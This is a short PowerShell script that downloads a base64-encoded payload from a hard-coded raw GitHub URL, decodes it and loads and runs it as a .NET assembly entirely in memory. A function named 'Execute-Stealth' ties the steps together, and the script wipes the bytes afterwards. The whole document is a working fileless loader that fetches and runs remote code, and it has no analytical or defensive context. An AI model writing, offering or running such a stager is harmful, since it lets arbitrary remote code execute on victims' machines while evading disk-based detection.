[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    # Nettoyer le Base64 (GitHub peut ajouter des retours à la ligne)
    $cleanBase64 = $base64.Trim() -replace '\s', ''
    $bytes = [Convert]::FromBase64String($cleanBase64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    $assembly = [System.Reflection.Assembly]::Load([byte[]]$bytes)

    $entryPoint = $assembly.EntryPoint
    if ($entryPoint -ne $null) {
        $entryPoint.Invoke($null, @())
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    Execute-InMemory -bytes $bytes

    [Array]::Clear($bytes, 0, $bytes.Length)
}

$url = "https://raw.githubusercontent.com/thegoatofapi/mth/main/file.txt"

Execute-Stealth -url $url
